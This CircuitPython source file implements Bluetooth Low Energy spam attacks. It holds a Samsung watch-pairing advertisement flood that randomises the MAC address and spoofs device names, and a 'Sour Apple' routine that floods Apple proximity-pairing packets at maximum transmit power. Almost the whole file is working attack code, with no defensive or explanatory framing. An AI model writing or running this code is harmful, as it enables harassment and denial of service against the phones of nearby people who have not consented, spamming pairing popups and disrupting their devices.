import _bleio
import struct
import time
import random

class BLEDevice:
    def __init__(self):
        self.adapter = _bleio.adapter

    def setup_device(self):
        if not self.adapter.enabled:
            self.adapter.enabled = True

    def start_advertising(self, manufacturer_id, watch_id):
        prepended_bytes = bytes.fromhex("010002000101FF000043")
        watch_bytes = bytes.fromhex(watch_id)
        manufacturer_specific_data = struct.pack('<H', manufacturer_id) + prepended_bytes + watch_bytes

        ad_type_flags = bytes([0x02, 0x01, 0x06])
        manufacturer_data_length = len(manufacturer_specific_data) + 1
        bt_packet = ad_type_flags + bytes([manufacturer_data_length, 0xFF]) + manufacturer_specific_data

        self.adapter.start_advertising(bt_packet, connectable=False, interval=0.1)
        time.sleep(0.03)

    def stop_advertising(self):
        self.adapter.stop_advertising()

def spoof_mac_address():
    current_address = _bleio.adapter.address
    print("current address:", current_address)

    address_bytes = bytearray(reversed(current_address.address_bytes)) 

    address_bytes[0] = random.randint(0x00, 0x3e)
    address_bytes[1] = random.randint(0x00, 0x7f)
    address_bytes[2] = random.randint(0x00, 0xff)
    address_bytes[3] = random.randint(0x00, 0xff)
    address_bytes[4] = random.randint(0x00, 0xff)
    address_bytes[5] = random.randint(0x00, 0xff)

    print(address_bytes)
    new_address = _bleio.Address(bytes(reversed(address_bytes)), _bleio.Address.RANDOM_STATIC)
    return new_address

def samsung_ble_spam(stop_cb):
    ble_device = BLEDevice()
    ble_device.setup_device()

    manufacturer_id = 0x0075
    watch_ids = ["1A", "01", "02", "03", "04", "05", "06", "07", "08", "09", "0A", "0B", "0C", "11", "12", "13", "14", "15", "16", "17", "18", "1B", "1C", "1D", "1E", "20"]
    while stop_cb():
        """
            As of 09.06.2024, Samsung is no longer filtering repetitive MACs,
            which leads to the conclusion that the 'SPAM' is not effective anymore.
            That doesn't help us, because spoofing becomes clearly useless,
            and the 'SPAM' becomes more like a one-time popup (maybe few if someone is turning the screen on/off frequently).
            I believe on some phones it may still work like usual, especially the older/ not updated ones.
        """
        _bleio.adapter.address = spoof_mac_address()
        _bleio.adapter.name = random.choice(["iPhone 16 PRO", "Samsung Galaxy 420 Edition"]) # Not necessary but since I added it, ima just leave it here
        watch_id = random.choice(watch_ids)
        
        print(f"Spoofed adapter name: {_bleio.adapter.name}")
        print(f'Spoofed MAC address: {ble_device.adapter.address}')
        print(f'Current watch_id: {watch_id}')

        ble_device.start_advertising(manufacturer_id, watch_id)
        time.sleep(1)
        ble_device.stop_advertising()

def sour_apple(stop_cb, delay=0.2):
    ble = _bleio.adapter
    ble.enabled = True
    ble.name = "Sour Apple :)"
    spoof_mac_address()
    print("Starting advertisement flood...")

    try:
        while stop_cb():
            types = [0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0]
            bt_packet = bytes([16, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1, types[random.randint(0, len(types) - 1)],
                            random.randint(0, 255), random.randint(0, 255), random.randint(0, 255), 0x00, 0x00, 0x10,
                            random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)])
            struct_params = [20, 20, 3, 0, 0, 0, 0, 0, 0, 0, 0, 7, 0]
            cmd_pkt = struct.pack("<HHBBB6BBB", *struct_params)

            ble.start_advertising(cmd_pkt, connectable=False, interval=0.2, tx_power=99)
            time.sleep(delay)
            ble.stop_advertising()

            ble.start_advertising(bytes([0x01]), connectable=False, interval=0.2, tx_power=99)
            time.sleep(delay)
            ble.stop_advertising()

            ble.start_advertising(bt_packet, connectable=False, interval=0.2, tx_power=99)
            time.sleep(delay)
            ble.stop_advertising()

            ble.start_advertising(bytes([0x00]), connectable=False, interval=0.2, tx_power=99)
            time.sleep(delay)
            ble.stop_advertising()

    except KeyboardInterrupt:
        print("Keyboard interrupt, stopping the advertisement flood..")
        ble.stop_advertising()
    except Exception as e:
        print(f"An error occurred: {e}")